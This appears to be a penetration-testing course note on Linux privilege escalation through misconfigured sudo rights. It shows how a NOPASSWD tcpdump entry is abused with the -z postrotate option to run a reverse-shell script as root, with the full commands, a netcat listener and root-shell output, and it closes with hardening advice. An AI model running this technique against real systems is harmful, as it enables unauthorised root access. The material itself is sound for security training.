# Sudo Rights Abuse

Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the **sudo** command is issued, the system will check if the user issuing the command has the appropriate rights, as configued **/etc/sudoers**.

When landing on a system, we should always check to see if the current user has nay privileges by typing `sudo -l`. Sometimes we will need to know the user's password to list their **sudo** rights, but any rights entries with the **NOPASSWD** options can be seen without entering a password.

`sudo -l`

It is easy to misconfigure this. For example, a user may be granted root-level permissions without requiring a password. Or permitted command line might be specified too loosely, allowing us to run a program in an unintended way, resulting privilege escalation. For example, if the sudoers file is edited to grant a user the right to run a command such as **tcpdump** per the following entry in the sudoers file: **(ALL) NOPASSWD: /usr/sbin/tcpdump** an attacker could leverage this to take advantage of the **postrostate-command**

`man tcpdump`

By specifying the -z flag, an attacker could use **tcpdump** to execute a shell script, gain a reverse shell as the root use or run other privileged commands. For example, an attacker could create the shell script **.test** containing a reverse shell and execute it as follows:

`sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root`

Let's try this out. First, make a file to execute with the **postrotate-command**. adding a simple reverse shell one-liner.

`cat /tmp/.test`

Next, start a **netcat** listener on our attacking box run **tcpdump** as root with the **postrotate-command**. If all goes to plan, we will receive a reverse shell connection.

`sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root`

```EXAMPLE OUTPUT
$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

[AppArmor](https://wiki.ubuntu.com/AppArmor) in mor recent distributions has predefined the commands, used with the **postrotate-command**, effectively preventing command execution. Two best practices that should always be considered when provisioning **sudo** rights:

1. Always specify the absolute path to any binaries listed in the **sudoers** file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next session) to create a malicious binary that will be executed when the command runs (i.e., if the sudoers entry specifies **cat** instead of **/bin/cat** this could likely be abused).
2. Grant **sudo** rights sparingly and based on the principle of least privilege. Does the user need full **sudo** rights? Can they still perform their job with one or two entries in the **sudoers** file? Limiting the privileged command that user can run will greatly reduce the likelihood of successful privilege escalation.

---

↩️: [Home](../../index.md)
